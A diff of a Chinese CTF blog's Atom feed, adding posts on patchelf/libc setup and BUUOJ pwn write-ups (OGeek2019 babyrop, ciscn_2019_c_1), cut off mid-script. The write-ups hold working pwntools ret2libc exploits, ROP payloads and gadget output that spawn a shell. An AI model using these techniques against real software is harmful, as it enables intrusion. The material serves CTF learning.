@@ -3,11 +3,11 @@
   <title>ruom0</title>
   
   
-  <link href="https://ruom0.github.io/atom.xml" rel="self"/>
+  <link href="https://www.ruomo.fun/atom.xml" rel="self"/>
   
-  <link href="https://ruom0.github.io/"/>
-  <updated>2021-06-18T06:02:34.287Z</updated>
-  <id>https://ruom0.github.io/</id>
+  <link href="https://www.ruomo.fun/"/>
+  <updated>2021-06-21T05:59:06.809Z</updated>
+  <id>https://www.ruomo.fun/</id>
   
   <author>
     <name>ruom0</name>
@@ -17,9 +17,63 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>pwn使用指定libc运行程序</title>
+    <link href="https://www.ruomo.fun/2021/06/21/others/pwn%E4%BD%BF%E7%94%A8%E6%8C%87%E5%AE%9Alibc%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F/"/>
+    <id>https://www.ruomo.fun/2021/06/21/others/pwn%E4%BD%BF%E7%94%A8%E6%8C%87%E5%AE%9Alibc%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F/</id>
+    <published>2021-06-21T04:46:11.838Z</published>
+    <updated>2021-06-21T05:59:06.809Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="patchelf安装">patchelf安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/NixOS/patchelf.git</span><br><span class="line">./bootstrap.sh</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p>如果出现报错<code>./bootstrap.sh: 2: autoreconf: not found</code>则运行<code>sudo apt-get install autoconf automake libtool</code>后再<code>./bootstrap.sh</code></p><h3 id="glibc-all-in-one安装">glibc-all-in-one安装</h3><p><code>git clone https://github.com/matrix1001/glibc-all-in-one</code></p><h3 id="使用指定libc运行程序">使用指定libc运行程序</h3><ol><li><p>使用glibc-all-in-one下载，或者自己去镜像站下载，如http://ftp.osuosl.org/pub/ubuntu/pool/main/g/glibc/，这里ubuntu的。如果自己下载的deb，那就先用glibc-all-in-one的<code>extract</code>将deb输出</p></li><li><p>调用命令<code>ldd program</code>先看下当前程序的链接情况，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/buuoj/【OGeek2019】babyrop]</span><br><span class="line">└─$ ldd pwn</span><br><span class="line">        linux-gate.so.1 (0xf7f49000)</span><br><span class="line">        libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7d44000)</span><br><span class="line">        /lib/ld-linux.so.2 (0xf7f4b000)</span><br></pre></td></tr></table></figure></li><li><p>用patchelf修改，如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter ~/Desktop/test/ld-linux.so.2 ./pwn</span><br><span class="line">patchelf --replace-needed libc.so.6 ~/Desktop/test/libc-2.23.so ./pwn</span><br></pre></td></tr></table></figure></li></ol>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h3 id=&quot;patchelf安装&quot;&gt;patchelf安装&lt;/h3&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span c</summary>
+      
+    
+    
+    
+    <category term="others" scheme="https://www.ruomo.fun/categories/others/"/>
+    
+    
+    <category term="pwn" scheme="https://www.ruomo.fun/tags/pwn/"/>
+    
+    <category term="kali" scheme="https://www.ruomo.fun/tags/kali/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>【OGeek2019】babyrop</title>
+    <link href="https://www.ruomo.fun/2021/06/21/buuoj/OGeek2019_babyrop/"/>
+    <id>https://www.ruomo.fun/2021/06/21/buuoj/OGeek2019_babyrop/</id>
+    <published>2021-06-21T03:30:50.575Z</published>
+    <updated>2021-06-21T04:42:29.017Z</updated>
+    
+    <content type="html"><![CDATA[<p>checksec结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ checksec --file=pwn</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Full RELRO      No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols        No    0               3               pwn</span><br></pre></td></tr></table></figure><p>拖入ida分析，<code>main</code>源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> buf; <span class="comment">// [esp+4h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [esp+Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  sub_80486BB();</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &gt; <span class="number">0</span> )</span><br><span class="line">    read(fd, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v2 = sub_804871F(buf);</span><br><span class="line">  sub_80487D0(v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到首先会产生一个随机数，存入到buf里面；接着把buf当作参数传入函数<code>sub_804871F</code>中，将函数的返回值存入v2中；最后将v2作为参数传入<code>sub_80487D0</code>函数中。</p><p>看一下<code>sub_804871F</code>的源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_804871F</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">32</span>]; <span class="comment">// [esp+2Ch] [ebp-2Ch] BYREF</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v5; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%ld&quot;</span>, a1);</span><br><span class="line">  v5 = read(<span class="number">0</span>, buf, <span class="number">0x20</span>u);</span><br><span class="line">  buf[v5 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(buf, s, v1) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Correct\n&quot;</span>, <span class="number">8u</span>);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> __int8)buf[<span class="number">7</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从源码中可以看到会先将传入的参数a1转为字符串存到变量s中，接着用户可以输入内容存入buf中，然后把buf和s比较，如果不相等就结束程序，相等就返回buf变量中的第8个字符。</p><p>这里存在一个漏洞点，函数使用<code>strncmp</code>进行比较，比较的长度v1是用<code>strlen</code>取得buf的长度，因此可以用<code>\x00</code>使得v1的值为0绕过<code>strncmp</code>，也就是说我们可以控制<code>main</code>中的v2的值。</p><p>接下来看一下<code>sub_80487D0</code>的源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __cdecl <span class="title">sub_80487D0</span><span class="params">(<span class="keyword">char</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">231</span>]; <span class="comment">// [esp+11h] [ebp-E7h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">127</span> )</span><br><span class="line">    result = read(<span class="number">0</span>, buf, <span class="number">0xC8</span>u);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = read(<span class="number">0</span>, buf, a1);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从上述代码可以发现，如果使得a1的值不等于127，就可以任意控制read接受字符串的长度，那就可以利用栈溢出，同时没有找到后门函数，需要自己构造rop。</p><p>整理一下思路，大致为：</p><ol><li>输入字符串，第一个字符是<code>\x00</code>绕过和随机数的比较</li><li>控制buf[7]的值，完成栈溢出</li><li>泄露write的地址，计算出system函数和/bin/sh的地址</li><li>重新运行一遍<code>main</code>函数，再次栈溢出，调用system(‘/bin/sh’)</li></ol><p>从上述思路可以整理出脚本如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">is_debug = 1</span><br><span class="line">file_name = &#x27;./pwn&#x27;</span><br><span class="line">host = &#x27;node3.buuoj.cn&#x27;</span><br><span class="line">port = 25562</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">if is_debug:</span><br><span class="line">sh = process(file_name)</span><br><span class="line">else:</span><br><span class="line">sh = remote(host, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">write_got = elf.got[&#x27;write&#x27;]</span><br><span class="line">write_plt = elf.plt[&#x27;write&#x27;]</span><br><span class="line">main_addr = 0x8048825</span><br><span class="line"></span><br><span class="line"># write address disclosure</span><br><span class="line">payload1 = &#x27;\x00&#x27; + &#x27;\xff&#x27; * 8</span><br><span class="line">payload2 = b&#x27;a&#x27; * 0xeb + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4) + p32(main_addr)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload1)</span><br><span class="line">sh.sendlineafter(&#x27;Correct\n&#x27;, payload2)</span><br><span class="line">write_addr = u32(sh.recv(4))</span><br><span class="line"></span><br><span class="line"># system&amp;/bin/sh</span><br><span class="line">libc = LibcSearcher(&#x27;write&#x27;, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(&#x27;write&#x27;)</span><br><span class="line">sys_addr = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"></span><br><span class="line"># get shell</span><br><span class="line">payload3 = b&#x27;a&#x27; * 0xeb + p32(sys_addr) + p32(sys_addr) + p32(bin_sh_addr)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line">sh.sendlineafter(&#x27;Correct\n&#x27;, payload3)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;checksec结果：&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/sp</summary>
+      
+    
+    
+    
+    <category term="buuoj" scheme="https://www.ruomo.fun/categories/buuoj/"/>
+    
+    
+    <category term="buuoj" scheme="https://www.ruomo.fun/tags/buuoj/"/>
+    
+    <category term="pwn" scheme="https://www.ruomo.fun/tags/pwn/"/>
+    
+  </entry>
+  
+  <entry>
     <title>【第五空间2019决赛】PWN5</title>
-    <link href="https://ruom0.github.io/2021/06/18/buuoj/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%20%E5%86%B3%E8%B5%9BPWN5/"/>
-    <id>https://ruom0.github.io/2021/06/18/buuoj/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%20%E5%86%B3%E8%B5%9BPWN5/</id>
+    <link href="https://www.ruomo.fun/2021/06/18/buuoj/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%20%E5%86%B3%E8%B5%9BPWN5/"/>
+    <id>https://www.ruomo.fun/2021/06/18/buuoj/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%20%E5%86%B3%E8%B5%9BPWN5/</id>
     <published>2021-06-18T05:42:49.730Z</published>
     <updated>2021-06-18T06:02:34.287Z</updated>
     
@@ -34,23 +88,23 @@
     
     
     
-    <category term="buuoj" scheme="https://ruom0.github.io/categories/buuoj/"/>
+    <category term="buuoj" scheme="https://www.ruomo.fun/categories/buuoj/"/>
     
     
-    <category term="buuoj" scheme="https://ruom0.github.io/tags/buuoj/"/>
+    <category term="buuoj" scheme="https://www.ruomo.fun/tags/buuoj/"/>
     
-    <category term="pwn" scheme="https://ruom0.github.io/tags/pwn/"/>
+    <category term="pwn" scheme="https://www.ruomo.fun/tags/pwn/"/>
     
   </entry>
   
   <entry>
     <title>ciscn_2019_c_1</title>
-    <link href="https://ruom0.github.io/2021/06/18/buuoj/ciscn_2019_c_1/"/>
-    <id>https://ruom0.github.io/2021/06/18/buuoj/ciscn_2019_c_1/</id>
+    <link href="https://www.ruomo.fun/2021/06/18/buuoj/ciscn_2019_c_1/"/>
+    <id>https://www.ruomo.fun/2021/06/18/buuoj/ciscn_2019_c_1/</id>
     <published>2021-06-18T03:36:10.729Z</published>
-    <updated>2021-06-18T05:32:55.026Z</updated>
+    <updated>2021-06-21T04:41:45.425Z</updated>
     
-    <content type="html"><![CDATA[<p>checksec结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   85) Symbols       No    0               1               ciscn_2019_c_1</span><br></pre></td></tr></table></figure><p>拖入ida64分析，<code>main</code>函数没有什么价值，就是判断输入内容，1就调用<code>encrypt</code>函数；2就让你自己解密，他不管；3就结束。</p><p>唯一可以看的就一个加密函数，代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">encrypt</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  __int16 v3; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your Plaintext to be encrypted&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)x;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(s) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( s[x] &lt;= <span class="number">96</span> || s[x] &gt; <span class="number">122</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( s[x] &lt;= <span class="number">64</span> || s[x] &gt; <span class="number">90</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( s[x] &gt; <span class="number">47</span> &amp;&amp; s[x] &lt;= <span class="number">57</span> )</span><br><span class="line">          s[x] ^= <span class="number">0xF</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        s[x] ^= <span class="number">0xE</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      s[x] ^= <span class="number">0xD</span>u;</span><br><span class="line">    &#125;</span><br><span class="line">    ++x;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ciphertext&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>刚进函数，就有一个gets入眼，那么搜索一下危险函数，然而并没有任何发现。那这题就只能自己构造ROP去调用system(‘/bin/sh’)了，这里利用puts函数来计算地址。</p><p>首先用ROPgadget搜一下pop rdi ; ret和ret</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ ROPgadget --binary ./ciscn_2019_c_1 --only <span class="string">&quot;pop|ret&quot;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0000000000400c7c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400c7e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400c80 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400c82 : pop r15 ; ret</span><br><span class="line">0x0000000000400c7b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400c7f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007f0 : pop rbp ; ret</span><br><span class="line">0x0000000000400aec : pop rbx ; pop rbp ; ret</span><br><span class="line">0x0000000000400c83 : pop rdi ; ret</span><br><span class="line">0x0000000000400c81 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x0000000000400c7d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006b9 : ret</span><br><span class="line">0x00000000004008ca : ret 0x2017</span><br><span class="line">0x0000000000400962 : ret 0x458b</span><br><span class="line">0x00000000004009c5 : ret 0xbf02</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 15</span><br><span class="line">                                                                                                                                                   </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ ROPgadget --binary ./ciscn_2019_c_1 --only <span class="string">&quot;ret&quot;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x00000000004006b9 : ret</span><br><span class="line">0x00000000004008ca : ret 0x2017</span><br><span class="line">0x0000000000400962 : ret 0x458b</span><br><span class="line">0x00000000004009c5 : ret 0xbf02</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 4</span><br></pre></td></tr></table></figure><p>找到pop rdi ; ret地址<code>0x400c83</code>，ret地址<code>0x4006b9</code>。</p><p>首先需要泄露出puts函数的地址，这样才能算出system函数和字符串/bin/sh的地址。为了节省时间，第一个字符用<code>\x00</code>来绕过strlen以此来跳过循环加密。因为后面还需要调用<code>system('/bin/sh')</code>，因此还需要再执行一次main函数。</p><p>根据以上条件构造出第一个payload：<code>payload1 = b'\x00' + b'a' * 0x57 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(_start_addr)</code></p><p>先用这部分看看输出情况，写出如下脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">1</span></span><br><span class="line">file_name = <span class="string">&#x27;./ciscn_2019_c_1&#x27;</span></span><br><span class="line">host = <span class="string">&#x27;node3.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">25980</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"><span class="keyword">if</span> is_debug:</span><br><span class="line">sh = process(file_name)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">sh = remote(host, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">pop_rdi_ret = <span class="number">0x400c83</span></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">_start_addr = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x57</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(_start_addr)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload1)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ python3 exp.py                                                                                                                             1 ⨯</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>: pid 3461</span><br><span class="line">[*] <span class="string">&#x27;/home/kali/Desktop/ciscn_2019_c_1&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">4196064</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Ciphertext</span><br><span class="line"></span><br><span class="line">\xf0\x85j\xe0\x7f</span><br><span class="line">EEEEEEE                            hh      iii                </span><br><span class="line">EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  </span><br><span class="line">EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e </span><br><span class="line">EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  </span><br><span class="line">EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee </span><br><span class="line">====================================================================</span><br><span class="line">Welcome to this Encryption machine</span><br><span class="line"></span><br><span class="line">====================================================================</span><br><span class="line">1.Encrypt</span><br><span class="line">2.Decrypt</span><br><span class="line">3.Exit</span><br><span class="line">Input your choice!</span><br><span class="line">$</span><br></pre></td></tr></table></figure><p>从上面可以看到puts函数的地址被泄露出来了，接下来就是用LibcSearcher来搜索puts的在libc中的地址，然后计算偏移量，再用system和/bin/sh在libc中的地址加上偏移量得到真实地址。然后再溢出调用system(‘/bin/sh’)。</p><p>最终脚本如下：</p><blockquote><p>ps: 这边不知道为什么，我本地libc用2.31的EOF，然后我指定用2.27直接EOF，输入都不给输入。。但是buu的服务器上面上去让我选又得选那个2.27的才能正常通过……迷惑。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 